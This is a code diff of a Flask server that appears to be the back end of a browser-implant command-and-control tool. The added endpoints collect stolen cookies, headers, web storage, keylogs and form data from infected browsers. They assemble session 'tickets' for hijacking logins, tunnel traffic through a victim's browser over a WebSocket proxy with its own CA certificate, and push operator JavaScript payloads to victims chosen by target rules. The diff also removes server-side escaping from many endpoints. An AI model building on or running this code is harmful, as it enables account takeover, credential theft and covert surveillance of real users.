+    saveBeaconVisit(identifier, domain, url, ip, userAgent)
+
+    # Fetch domain object to get its ID for the capture link
+    domainObj = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
+    if domainObj:
+        # Deduplication: Check for same capture in the last 10 minutes
+        lastCapture = BeaconCapture.query.filter_by(
+            domainID=domainObj.id,
+            captureType=captureType,
+            name=name,
+            value=value
+        ).order_by(BeaconCapture.capturedAt.desc()).first()
+
+        shouldSave = True
+        if lastCapture:
+            now = datetime.datetime.now(datetime.timezone.utc)
+            # Ensure lastCapture.capturedAt is timezone aware if now is
+            lastCapturedAt = lastCapture.capturedAt
+            if lastCapturedAt.tzinfo is None:
+                lastCapturedAt = lastCapturedAt.replace(tzinfo=datetime.timezone.utc)
+
+            timeDiff = now.timestamp() - lastCapturedAt.timestamp()
+            if timeDiff < 600: # 10 minutes
+                shouldSave = False
+
+        if shouldSave:
+            # Save the capture
+            newCapture = BeaconCapture(domainID=domainObj.id, captureType=captureType, name=name, value=value, extraData=extraData)
+            db_session.add(newCapture)
+            dbCommit()
+    
+    
+    # Dump the full Fetch api call info
 @app.route('/loot/fetchRequest/<identifier>', methods=['POST'])
 def recordFetchDump(identifier):
     if not isClientSessionValid(identifier):
@@ -2018,10 +3187,7 @@ def recordFetchDump(identifier):
 
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveFetchDump(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -2067,10 +3233,7 @@ def recordFormPost(identifier):
     # logger.info("## Recording Form Post")
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveFormPost(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -2109,10 +3272,7 @@ def recordCustomExfil(identifier):
     note = content.get('note', None)
     data = content.get('data', None)
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveCustomExfil(identifier, note, data, ip, request.headers.get('User-Agent'))
 
@@ -2133,14 +3293,427 @@ def recordCustomExfil(identifier):
 def getClients():
     clients = Client.query.all()
 
-    allClients = [{'id':escape(client.id), 'tag':escape(client.tag), 'nickname':escape(client.nickname), 'notes':escape(client.notes), 
-        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen, 'ip':escape(client.ipAddress),
-        'platform':escape(client.platform), 'browser':escape(client.browser), 'isStarred':client.isStarred, 'hasJobs':client.hasJobs, 
-        'fingerprint':client.fingerprint} for client in clients]
+    allClients = []
+    for client in clients:
+        # Fallback for existing clients without the domain field set
+        display_domain = client.domain
+        if not display_domain and client.clientType != 'bex-beacon':
+            latest_url = UrlVisited.query.filter_by(clientID=client.uuid).order_by(UrlVisited.timeStamp.desc()).first()
+            if latest_url:
+                from urllib.parse import urlparse
+                parsed = urlparse(latest_url.url)
+                display_domain = parsed.hostname
+
+        allClients.append({
+            'id': client.id,
+            'uuid': client.uuid,
+            'tag': client.tag,
+            'clientType': client.clientType,
+            'parentUUID': client.parentUUID if client.parentUUID else None,
+            'domain': display_domain if display_domain else None,
+            'nickname': client.nickname,
+            'notes': client.notes,
+            'firstSeen': client.firstSeen,
+            'lastSeen': client.lastSeen,
+            'ip': client.ipAddress,
+            'platform': client.platform,
+            'browser': client.browser,
+            'isStarred': client.isStarred,
+            'hasJobs': client.hasJobs,
+            'fingerprint': client.fingerprint,
+            'sidecarSupported': client.sidecarSupported,
+            'sidecarConnected': client.sidecarConnected
+        })
 
     return jsonify(allClients)
 
 
+
+
+@app.route('/api/jstap/domains/<id>', methods=['GET'])
+@login_required
+def getBexDomains(id):
+    client = Client.query.filter_by(id=id).first()
+    if not client:
+        return jsonify([])
+    
+    domains = BeaconDomain.query.filter_by(clientID=client.uuid).all()
+    domainData = []
+    
+    for d in domains:
+        # Get visit count
+        visitCount = BeaconVisit.query.filter_by(domainID=d.id).count()
+        # Get last visited URL
+        lastVisit = BeaconVisit.query.filter_by(domainID=d.id).order_by(BeaconVisit.visitTime.desc()).first()
+        lastUrl = lastVisit.url if lastVisit else ""
+        
+        domainData.append({
+            'id': d.id, 
+            'domain': d.domain, 
+            'firstSeen': d.firstSeen, 
+            'lastSeen': d.lastSeen,
+            'visitCount': visitCount,
+            'lastUrl': lastUrl
+        })
+
+    return jsonify(domainData)
+
+
+@app.route('/api/jstap/visits/<domainID>', methods=['GET'])
+@login_required
+def getBexVisits(domainID):
+    visits = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).limit(100).all()
+    visitData = [{'id': v.id, 'url': v.url, 'visitTime': v.visitTime} for v in visits]
+    return jsonify(visitData)
+
+
+@app.route('/api/jstap/captures/<domainID>', methods=['GET'])
+@login_required
+def getBexCaptures(domainID):
+    captures = BeaconCapture.query.filter_by(domainID=domainID).all()
+    captureData = [{'id': c.id, 'type': c.captureType, 'name': c.name, 'value': c.value, 'metadata': c.extraData, 'capturedAt': c.capturedAt} for c in captures]
+    return jsonify(captureData)
+
+
+@app.route('/api/jstap/ticket/<domainID>', methods=['GET'])
+@login_required
+def getBexTicket(domainID):
+    domain = BeaconDomain.query.filter_by(id=domainID).first()
+    if not domain:
+        return jsonify({'error': 'Domain not found'}), 404
+
+    client = Client.query.filter_by(uuid=domain.clientID).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    # Get all captures for this domain
+    captures = BeaconCapture.query.filter_by(domainID=domainID).order_by(BeaconCapture.capturedAt.desc()).all()
+
+    # Deduplicate: keep most recent per (captureType, name)
+    seen = set()
+    deduped = []
+    for c in captures:
+        key = (c.captureType, c.name)
+        if key not in seen:
+            seen.add(key)
+            deduped.append(c)
+
+    cookies = []
+    headers = []
+    localStorage = []
+    sessionStorage = []
+
+    for c in deduped:
+        if c.captureType == 'cookie':
+            extra = {}
+            if c.extraData:
+                try:
+                    extra = json.loads(c.extraData)
+                except (json.JSONDecodeError, TypeError):
+                    pass
+            cookies.append({
+                'name': c.name,
+                'value': c.value,
+                'httpOnly': extra.get('httpOnly', False),
+                'secure': extra.get('secure', False),
+                'sameSite': extra.get('sameSite', 'no_restriction'),
+                'path': extra.get('path', '/'),
+                'domain': extra.get('domain', domain.domain),
+                'expirationDate': extra.get('expirationDate', None)
+            })
+        elif c.captureType == 'header':
+            headers.append({
+                'name': c.name,
+                'value': c.value
+            })
+        elif c.captureType == 'local_storage':
+            localStorage.append({
+                'key': c.name,
+                'value': c.value
+            })
+        elif c.captureType == 'session_storage':
+            sessionStorage.append({
+                'key': c.name,
+                'value': c.value
+            })
+
+    # Fallback: if individual cookie records are missing but we have a raw
+    # Cookie header (from INTERESTING_HEADERS), parse it to fill in the gaps.
+    # This handles the case where browser.cookies.getAll() failed silently
+    # but the header capture succeeded.
+    cookieNames = {c['name'] for c in cookies}
+    rawCookieHeader = next((h['value'] for h in headers if h['name'].lower() == 'cookie'), None)
+    if rawCookieHeader:
+        for pair in rawCookieHeader.split(';'):
+            pair = pair.strip()
+            if '=' in pair:
+                cName, cValue = pair.split('=', 1)
+                cName = cName.strip()
+                cValue = cValue.strip()
+                if cName and cName not in cookieNames:
+                    cookies.append({
+                        'name': cName,
+                        'value': cValue,
+                        'httpOnly': False,
+                        'secure': False,
+                        'sameSite': 'no_restriction',
+                        'path': '/',
+                        'domain': domain.domain,
+                        'expirationDate': None
+                    })
+                    cookieNames.add(cName)
+
+    # Get URLs from visits, deduplicated, most recent first
+    visits = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).all()
+    seenUrls = set()
+    urls = []
+    for v in visits:
+        if v.url not in seenUrls:
+            seenUrls.add(v.url)
+            urls.append(v.url)
+
+    ticket = {
+        'version': 1,
+        'type': 'session',
+        'generated': datetime.datetime.utcnow().isoformat() + 'Z',
+        'domain': domain.domain,
+        'userAgent': client.rawUserAgent or '',
+        'platform': client.platform or '',
+        'browser': client.browser or '',
+        'cookies': cookies,
+        'headers': headers,
+        'localStorage': localStorage,
+        'sessionStorage': sessionStorage,
+        'urls': urls
+    }
+
+    return jsonify(ticket)
+
+
+# ---------------------------------------------------------------------------
+# Bex Proxy — WebSocket + management API
+# ---------------------------------------------------------------------------
+from proxy.server import (
+    register_ws, unregister_ws, deliver_response,
+    start_proxy_for_beacon, stop_proxy_for_beacon, stop_all_proxies,
+    get_proxy_instance, get_all_proxy_instances, is_proxy_running_for,
+    is_proxy_running, has_ws_connection,
+)
+from proxy.certs import CA_CERT_PATH
+
+
+@sock.route('/ws/proxy/<session_uuid>')
+def proxy_websocket(ws, session_uuid):
+    """Persistent WebSocket for a beacon in proxy mode.
+    The beacon connects here after receiving a PROXY_START task."""
+    client = Client.query.filter_by(uuid=session_uuid).first()
+    if not client:
+        ws.close()
+        return
+
+    logger.info(f"Proxy WS: Beacon {session_uuid} connected")
+    register_ws(session_uuid, ws.send)
+
+    try:
+        while True:
+            msg = ws.receive(timeout=None)
+            if msg is None:
+                break
+            try:
+                data = json.loads(msg)
+                msg_type = data.get('type')
+                if msg_type == 'response':
+                    req_id = data.get('id', '?')
+                    status = data.get('status', '?')
+                    logger.info(f"Proxy WS: Got response from beacon (req_id={req_id}, status={status})")
+                    deliver_response(data.get('id'), data)
+                elif msg_type == 'ping':
+                    from proxy.server import _ws_send_lock
+                    with _ws_send_lock:
+                        ws.send(json.dumps({'type': 'pong'}))
+                else:
+                    logger.info(f"Proxy WS: Unknown message type '{msg_type}' from {session_uuid}: {str(msg)[:200]}")
+            except json.JSONDecodeError:
+                logger.warning(f"Proxy WS: Bad JSON from {session_uuid}: {str(msg)[:200]}")
+    except Exception as e:
+        logger.info(f"Proxy WS: Beacon {session_uuid} disconnected: {e}")
+    finally:
+        unregister_ws(session_uuid)
+        logger.info(f"Proxy WS: Beacon {session_uuid} cleaned up")
+
+
+@app.route('/api/proxy/start', methods=['POST'])
+@login_required
+def startProxy():
+    content = request.json
+    beaconID_raw = content.get('beaconID')
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+
+    # Start (or return existing) proxy instance for this beacon
+    inst = start_proxy_for_beacon(beacon_uuid)
+    if not inst:
+        return jsonify({'error': 'Failed to start proxy (no available ports)'}), 500
+
+    # Queue a PROXY_START task for the beacon so it opens a WebSocket back to us
+    taskData = {
+        "type": "PROXY_START",
+    }
+    jsonStr = json.dumps(taskData)
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
+                              code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+    db_session.add(newJob)
+    dbCommit()
+
+    logger.info(f"Proxy: Started for beacon {beacon_uuid} on port {inst.port}")
+    return jsonify({
+        'status': 'started',
+        'port': inst.port,
+        'beaconID': beacon_uuid,
+        'authToken': inst.auth_token,
+        'caCertPath': CA_CERT_PATH,
+    })
+
+
+@app.route('/api/proxy/stop', methods=['POST'])
+@login_required
+def stopProxy():
+    content = request.json or {}
+    beaconID_raw = content.get('beaconID')
+
+    if not beaconID_raw:
+        return jsonify({'error': 'beaconID required'}), 400
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+
+    # Queue a PROXY_STOP task for the beacon
+    taskData = {"type": "PROXY_STOP"}
+    jsonStr = json.dumps(taskData)
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
+                              code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+    db_session.add(newJob)
+    dbCommit()
+
+    stop_proxy_for_beacon(beacon_uuid)
+    return jsonify({'status': 'stopped', 'beaconID': beacon_uuid})
+
+
+@app.route('/api/proxy/status', methods=['GET'])
+@login_required
+def proxyStatus():
+    beaconID_raw = request.args.get('beaconID')
+
+    if beaconID_raw:
+        # Status for a specific beacon
+        client = Client.query.filter_by(id=beaconID_raw).first()
+        if not client:
+            client = Client.query.filter_by(uuid=beaconID_raw).first()
+        if not client:
+            return jsonify({'error': 'Client not found'}), 404
+
+        beacon_uuid = client.uuid
+        inst = get_proxy_instance(beacon_uuid)
+        return jsonify({
+            'running': inst is not None and inst.running,
+            'beaconID': beacon_uuid,
+            'port': inst.port if inst else None,
+            'authToken': inst.auth_token if inst else None,
+            'wsConnected': has_ws_connection(beacon_uuid),
+        })
+    else:
+        # Summary of all running proxies
+        instances = get_all_proxy_instances()
+        proxies = []
+        for beacon_uuid, inst in instances.items():
+            proxies.append({
+                'beaconID': beacon_uuid,
+                'port': inst.port,
+                'wsConnected': has_ws_connection(beacon_uuid),
+            })
+        return jsonify({
+            'running': len(proxies) > 0,
+            'proxies': proxies,
+        })
+
+
+@app.route('/api/jstap/proxy_ticket/<beaconID>', methods=['GET'])
+@login_required
+def getBexProxyTicket(beaconID):
+    """Generate a proxy ticket for JS-Tap Conductor. Only available when proxy is active."""
+    client = Client.query.filter_by(id=beaconID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    beacon_uuid = client.uuid
+    inst = get_proxy_instance(beacon_uuid)
+    if not inst or not inst.running:
+        return jsonify({'error': 'No active proxy for this beacon'}), 400
+
+    # Get domains for this beacon
+    domains = BeaconDomain.query.filter_by(clientID=beacon_uuid).all()
+    domain_list = [d.domain for d in domains]
+
+    # Derive proxy host from the operator's request Host header
+    proxy_host = request.host.split(':')[0]
+
+    # Get beacon nickname (if set)
+    beacon_nickname = client.nickname or ''
+
+    ticket = {
+        'version': 1,
+        'type': 'proxy',
+        'generated': datetime.datetime.utcnow().isoformat() + 'Z',
+        'beaconNickname': beacon_nickname,
+        'proxy': {
+            'host': proxy_host,
+            'port': inst.port,
+            'username': 'proxy',
+            'password': inst.auth_token,
+        },
+        'domains': domain_list,
+        'userAgent': client.rawUserAgent or '',
+        'platform': client.platform or '',
+        'browser': client.browser or '',
+    }
+
+    return jsonify(ticket)
+
+
+@app.route('/api/proxy/ca_cert', methods=['GET'])
+@login_required
+def downloadCaCert():
+    """Download the proxy CA certificate for browser import.
+    Generates the CA on first request if it doesn't exist yet."""
+    try:
+        if not os.path.exists(CA_CERT_PATH):
+            from proxy.certs import ensure_ca
+            ensure_ca()
+
+        with open(CA_CERT_PATH, 'rb') as f:
+            cert_data = f.read()
+
+        response = make_response(cert_data)
+        response.headers['Content-Type'] = 'application/x-x509-ca-cert'
+        response.headers['Content-Disposition'] = 'attachment; filename=jstap-proxy-ca.pem'
+        response.headers['Content-Length'] = len(cert_data)
+        return response
+    except Exception as e:
+        logger.error(f"CA cert download failed: {e}")
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/clientEvents/<id>', methods=['GET'])
@@ -2152,8 +3725,8 @@ def getClientEvents(id):
 
     events = Event.query.filter_by(clientID=clientUUID)
 
-    eventData = [{'id':escape(event.id), 'timeStamp':event.timeStamp, 
-        'eventType':escape(event.eventType), 'eventID':escape(event.eventID)} for event in events]
+    eventData = [{'id':event.id, 'timeStamp':event.timeStamp,
+        'eventType':event.eventType, 'eventID':event.eventID} for event in events]
 
     return jsonify(eventData)
 
@@ -2164,7 +3737,7 @@ def getClientEvents(id):
 def getClientScreenshots(key):
     screenshot = Screenshot.query.filter_by(id=key).first()
 
-    screenshotData = {'fileName':escape(screenshot.fileName)}
+    screenshotData = {'fileName':screenshot.fileName}
     
 
     return jsonify(screenshotData)
@@ -2193,7 +3766,7 @@ def getClientHtml(key):
 def getClientUrls(key):
     urlsVisited = UrlVisited.query.filter_by(id=key).first()
 
-    urlData = {'url':escape(urlsVisited.url)}
+    urlData = {'url':urlsVisited.url}
     
 
     return jsonify(urlData)
@@ -2205,7 +3778,7 @@ def getClientUrls(key):
 def getClientUserInputs(key):
     userInput = UserInput.query.filter_by(id=key).first()
 
-    userInputData = {'inputName':escape(userInput.inputName), 'inputValue':escape(userInput.inputValue)}
+    userInputData = {'inputName':userInput.inputName, 'inputValue':userInput.inputValue}
     
 
     return jsonify(userInputData)
@@ -2218,7 +3791,7 @@ def getClientCookies(key):
     # logger.info("*** In cookie lookup, key is: " + key)
     cookie = Cookie.query.filter_by(id=key).first()
 
-    cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
+    cookieData = {'cookieName':cookie.cookieName, 'cookieValue':cookie.cookieValue}
     
 
     return jsonify(cookieData)
@@ -2234,7 +3807,7 @@ def getClientLocalStorage(key):
     localStorage = LocalStorage.query.filter_by(id=key).first()
     # logger.info("Sending back: " + localStorage.key + ":" + localStorage.value)
     
-    localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
+    localStorageData = {'localStorageKey':localStorage.key, 'localStorageValue':localStorage.value}
     
 
     return jsonify(localStorageData)
@@ -2246,14 +3819,21 @@ def getClientLocalStorage(key):
 @login_required
 def getClientSesssionStorage(key):
     sessionStorage = SessionStorage.query.filter_by(id=key).first()
-    
-    sessionStorageData = {'sessionStorageKey':escape(sessionStorage.key), 'sessionStorageValue':escape(sessionStorage.value)}
-    
+
+    sessionStorageData = {'sessionStorageKey':sessionStorage.key, 'sessionStorageValue':sessionStorage.value}
+
 
     return jsonify(sessionStorageData)
 
 
- 
+@app.route('/api/clientKeylog/<key>', methods=['GET'])
+@login_required
+def getClientKeylog(key):
+    keylog = Keylog.query.filter_by(id=key).first()
+
+    keylogData = {'keys': keylog.keys, 'target': keylog.target or '', 'url': keylog.url or ''}
+
+    return jsonify(keylogData)
 
 
 @app.route('/api/clientXhrApiCall/<key>', methods=['GET'])
@@ -2269,12 +3849,12 @@ def getClientXhrApiCall(key):
 
 
     xhrCallData = {
-        'method': escape(xhrApiCall.method),
-        'url': escape(xhrApiCall.url),
-        'asyncRequest': escape(xhrApiCall.asyncRequest),
-        'user': escape(xhrApiCall.user),
-        'password': escape(xhrApiCall.password),
-        'responseStatus': escape(xhrApiCall.responseStatus),
+        'method': xhrApiCall.method,
+        'url': xhrApiCall.url,
+        'asyncRequest': xhrApiCall.asyncRequest,
+        'user': xhrApiCall.user,
+        'password': xhrApiCall.password,
+        'responseStatus': xhrApiCall.responseStatus,
         'headers': headers_list
     }
 
@@ -2312,9 +3892,9 @@ def getClientFetchApiCall(key):
 
 
     fetchCallData = {
-        'method': escape(fetchApiCall.method),
-        'url': escape(fetchApiCall.url),
-        'responseStatus': escape(fetchApiCall.responseStatus),
+        'method': fetchApiCall.method,
+        'url': fetchApiCall.url,
+        'responseStatus': fetchApiCall.responseStatus,
         'headers': headers_list
     }
 
@@ -2338,11 +3918,13 @@ def getClientFetchCall(key):
 @app.route('/api/clientFormPosts/<key>', methods=['GET'])
 @login_required
 def getClientFormPost(key):
-    #logger.info("*** Fetching client form post..")
     formPost = FormPost.query.filter_by(id=key).first()
 
+    if not formPost:
+        return jsonify({'error': 'not found'}), 404
+
     # formAction and data are base64 encoded at this point
-    formPostData = {'name':escape(formPost.formName), 'action':formPost.formAction, 'method':escape(formPost.formMethod), 'data': formPost.formData, 'url':formPost.url}
+    formPostData = {'name':formPost.formName, 'action':formPost.formAction, 'method':formPost.formMethod, 'data': formPost.formData, 'url':formPost.url}
 
     return jsonify(formPostData)
 
@@ -2376,7 +3958,7 @@ def searchCsrfToken(key):
                     break
 
     if foundToken:
-        tokenFileData = {'url':escape(htmlCode.url), 'fileName':escape(htmlCode.fileName)}
+        tokenFileData = {'url':htmlCode.url, 'fileName':htmlCode.fileName}
     else:
         tokenFileData = {'url':'Not Found', 'fileName':'Not Found'}
 
@@ -2457,6 +4039,9 @@ def getClientCustomExfil(key):
 def getClientCustomExfilDetail(key):
     customExfil = CustomExfil.query.filter_by(id=key).first()
 
+    if not customExfil:
+        return jsonify({'error': 'not found'}), 404
+
     # Note these are base64 encoded at this point, they'll need
     # to be escaped client side
     customExfilData = {'note':customExfil.note, 'data':customExfil.data}
@@ -2479,12 +4064,63 @@ def setClientNotes(key):
     return "ok", 200
 
 
+@app.route('/api/updateClientNickname/<key>', methods=['POST'])
+@login_required
+def setClientNickname(key):
+    content  = request.json
+    nickname = content.get('nickname', '').strip()
+
+    if not nickname:
+        return jsonify({'error': 'Nickname cannot be empty'}), 400
+
+    if len(nickname) > 60:
+        return jsonify({'error': 'Nickname must be 60 characters or fewer'}), 400
+
+    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]*$', nickname):
+        return jsonify({'error': 'Nickname must start with a letter or number and contain only letters, numbers, spaces, hyphens, underscores, and periods'}), 400
+
+    client = Client.query.filter_by(id=key).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    # Check uniqueness (case-insensitive)
+    existing = Client.query.filter(Client.nickname == nickname, Client.id != int(key)).first()
+    if existing:
+        return jsonify({'error': 'Nickname "' + nickname + '" is already in use'}), 409
+
+    client.nickname = nickname
+    dbCommit()
+
+    return jsonify({'nickname': nickname}), 200
+
 
 @app.route('/api/allClientNotes', methods=['GET'])
 @login_required
 def getAllClientNotes():
     clients = Client.query.all()
-    allNoteData = [{'client':str(escape(client.nickname)), 'note':client.notes} for client in clients]
+    allNoteData = []
+    for client in clients:
+        if not client.notes:
+            continue
+
+        entry = {
+            'nickname':   client.nickname,
+            'tag':        client.tag or '',
+            'clientType': client.clientType,
+            'ipAddress':  client.ipAddress or '',
+            'platform':   client.platform or '',
+            'browser':    client.browser or '',
+            'firstSeen':  str(client.firstSeen) if client.firstSeen else '',
+            'lastSeen':   str(client.lastSeen) if client.lastSeen else '',
+            'note':       client.notes,
+        }
+
+        # Include domains for beacon clients
+        if client.clientType in ('bex-beacon', 'atom-beacon', 'v8-beacon'):
+            domains = BeaconDomain.query.filter_by(clientID=client.uuid).all()
+            entry['domains'] = [d.domain for d in domains]
+
+        allNoteData.append(entry)
 
     return jsonify(allNoteData)
 
@@ -2598,7 +4234,7 @@ def getShowFingerprint():
 def getEmailSettings():
     appSettings = AppSettings.query.filter_by(id=1).first()
 
-    emailData = {'emailServer':escape(appSettings.emailServer), 'username':escape(appSettings.emailUsername), 'password':'*********', 'eventType': escape(appSettings.emailEventType), 'delay': escape(appSettings.emailDelay)}
+    emailData = {'emailServer':appSettings.emailServer, 'username':appSettings.emailUsername, 'password':'*********', 'eventType': appSettings.emailEventType, 'delay': appSettings.emailDelay}
 
     return jsonify(emailData)
 
@@ -2664,7 +4300,7 @@ def getEmailNotifications():
 def getTargetEmails():
     targetEmails = NotificationEmail.query.all()
 
-    allEmails = [{'id':escape(targetEmail.id), 'address':escape(targetEmail.emailAddress)} for targetEmail in targetEmails]
+    allEmails = [{'id':targetEmail.id, 'address':targetEmail.emailAddress} for targetEmail in targetEmails]
 
     return jsonify(allEmails)
  
@@ -2799,6 +4435,8 @@ def deleteClientsByFilter():
 
         FormPost.query.filter_by(clientID=clientUUID).delete()
         Event.query.filter_by(clientID=clientUUID).delete()
+        PluginData.query.filter_by(clientID=clientUUID).delete()
+        PluginActivation.query.filter_by(clientID=clientUUID).delete()
         ClientPayloadJob.query.filter_by(clientKey=clientID).delete()
 
         # Delete loot files from disk
@@ -2822,7 +4460,7 @@ def deleteClientsByFilter():
 def getBlockedIPs():
     blockedIPs = BlockedIP.query.all()
 
-    allBlockedIPs = [{'id':escape(blockedIP.id), 'ip':escape(blockedIP.ip)} for blockedIP in blockedIPs]
+    allBlockedIPs = [{'id':blockedIP.id, 'ip':blockedIP.ip} for blockedIP in blockedIPs]
 
     return jsonify(allBlockedIPs)
 
@@ -2859,7 +4497,7 @@ def deleteBlockedIP(key):
 def getSavedCustomPayloads():
     savedPayloads = CustomPayload.query.all()
 
-    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]
+    allSavedPayloads = [{'id':payload.id, 'name':payload.name, 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]
 
     return jsonify(allSavedPayloads)
 
@@ -2886,8 +4524,8 @@ def getPayloadsForClient(key):
                 break
 
         payloadData = {
-            'id':escape(payload.id),
-            'name':escape(payload.name),
+            'id':payload.id,
+            'name':payload.name,
             'autorun':payload.autorun,
             'repeatrun':repeatRunFound
         }
@@ -2906,7 +4544,7 @@ def getPayloadsForClient(key):
 def getSavedPayloadCode(key):
     payload = CustomPayload.query.filter_by(id=key).first()
 
-    payloadData = {'name':escape(payload.name), 'description':escape(payload.description),'code':escape(payload.code)}
+    payloadData = {'name':payload.name, 'description':payload.description, 'code':payload.code}
 
     return jsonify(payloadData)
 
@@ -3051,17 +4689,184 @@ def clearAllPayloadJobs():
     CustomPayloads = CustomPayload.query.filter_by(autorun=True)
 
     for payload in CustomPayloads:
-        payload.autorun=False 
+        payload.autorun=False
 
     CustomPayloads = CustomPayload.query.filter_by(repeatrun=True)
 
     for payload in CustomPayloads:
-        payload.repeatrun=False 
+        payload.repeatrun=False
+
+    # Disable all target rule autorun and repeat flags
+    targetRules = PayloadTargetRule.query.filter_by(active=True).all()
+    for rule in targetRules:
+        rule.active = False
+    targetRules = PayloadTargetRule.query.filter_by(repeatrun=True).all()
+    for rule in targetRules:
+        rule.repeatrun = False
 
     dbCommit()
 
     return "ok", 200
    
+
+
+@app.route('/api/payload/targetRule/preview', methods=['POST'])
+@login_required
+def previewTargetRule():
+    content = request.json
+    filterQuery = content.get('filterQuery', '').strip()
+    if not filterQuery:
+        return jsonify({'matched': 0, 'clients': []}), 200
+
+    clients = Client.query.filter_by(sessionValid=True).all()
+    matched = []
+
+    for client in clients:
+        if clientMatchesFilter(client, filterQuery):
+            matched.append({
+                'nickname': client.nickname or client.uuid[:8],
+                'ip': client.ipAddress or '',
+                'platform': client.platform or '',
+                'browser': client.browser or '',
+                'tag': client.tag or '',
+                'clientType': client.clientType or '',
+                'domain': client.domain or '',
+                'firstSeen': client.firstSeen,
+                'lastSeen': client.lastSeen
+            })
+            if len(matched) >= 50:
+                break
+
+    return jsonify({'matched': len(matched), 'clients': matched}), 200
+
+
+
+@app.route('/api/payload/<int:payloadId>/targetRules', methods=['GET'])
+@login_required
+def getTargetRules(payloadId):
+    rules = PayloadTargetRule.query.filter_by(payloadKey=payloadId).all()
+    result = []
+    for r in rules:
+        result.append({
+            'id': r.id,
+            'payloadKey': r.payloadKey,
+            'filterQuery': r.filterQuery,
+            'active': r.active,
+            'repeatrun': r.repeatrun
+        })
+    return jsonify(result)
+
+
+
+@app.route('/api/payload/<int:payloadId>/targetRule', methods=['POST'])
+@login_required
+def addTargetRule(payloadId):
+    content = request.json
+    filterQuery = content.get('filterQuery', '').strip()
+    if not filterQuery:
+        return "Filter query required", 400
+
+    payload = CustomPayload.query.filter_by(id=payloadId).first()
+    if not payload:
+        return "Payload not found", 404
+
+    rule = PayloadTargetRule(payloadKey=payloadId, filterQuery=filterQuery)
+    db_session.add(rule)
+    dbCommit()
+
+    return jsonify({'id': rule.id}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/update', methods=['POST'])
+@login_required
+def updateTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    content = request.json
+    filterQuery = content.get('filterQuery', '').strip()
+    if not filterQuery:
+        return "Filter query required", 400
+
+    rule.filterQuery = filterQuery
+    dbCommit()
+
+    return jsonify({'id': rule.id, 'filterQuery': rule.filterQuery}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/toggle', methods=['POST'])
+@login_required
+def toggleTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    rule.active = not rule.active
+    dbCommit()
+
+    return jsonify({'active': rule.active}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/repeat', methods=['POST'])
+@login_required
+def toggleTargetRuleRepeat(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    rule.repeatrun = not rule.repeatrun
+    dbCommit()
+
+    return jsonify({'repeatrun': rule.repeatrun}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/run', methods=['POST'])
+@login_required
+def runTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
+    if not payload:
+        return "Payload not found", 404
+
+    clients = Client.query.filter_by(sessionValid=True).all()
+    matched = 0
+
+    for client in clients:
+        if clientMatchesFilter(client, rule.filterQuery):
+            # Check if client already has a job for this payload
+            existing = ClientPayloadJob.query.filter_by(clientKey=client.id, payloadKey=payload.id).first()
+            if not existing:
+                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
+                db_session.add(newJob)
+                matched += 1
+
+    if matched > 0:
+        dbCommit()
+
+    return jsonify({'matched': matched}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>', methods=['DELETE'])
+@login_required
+def deleteTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    db_session.delete(rule)
+    dbCommit()
+
+    return "ok", 200
+
 
 
 @app.route('/api/savePayload', methods=['POST'])
@@ -3120,10 +4925,337 @@ def saveCustomPayloads():
 @login_required
 def deleteCustomPayload(key):
     payload = CustomPayload.query.filter_by(id=key).first()
+
